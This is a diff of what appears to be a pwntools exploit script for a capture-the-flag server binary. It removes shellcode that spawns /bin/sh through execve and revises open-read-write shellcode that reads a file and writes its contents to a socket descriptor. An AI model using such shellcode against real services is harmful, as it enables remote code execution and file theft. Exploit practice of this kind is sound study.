@@ -18,18 +18,6 @@ if(len(sys.argv) > 1):
 else:
 	p = process("./server")
 
-
-shell = """
-   mov rdi, rsi
-   add rdi, 0x20B9
-   add rdi, 0x1d
-   mov rax, 0x3b
-   xor rsi, rsi
-   xor rdx, rdx
-   syscall
-   .string "/bin/sh"
-"""
-
 owr = """
     mov r12, rdi
     mov rax, 0x101010101010101
@@ -43,7 +31,7 @@ owr = """
     push SYS_open /* 2 */
     pop rax
     syscall
-    /* call read(3, 'rsp', 0x64) */
+    /* call read(fd_open, 'rsp', 0x64) */
     push rax
     xor eax, eax /* SYS_read */
     pop rdi
@@ -51,7 +39,7 @@ owr = """
     pop rdx
     mov rsi, rsp
     syscall
-    /* write(fd=1, buf='rsp', n=0x64) */
+    /* write(fd_socket, buf='rsp', n=0x64) */
     push r12
     pop rdi
     push 0x64
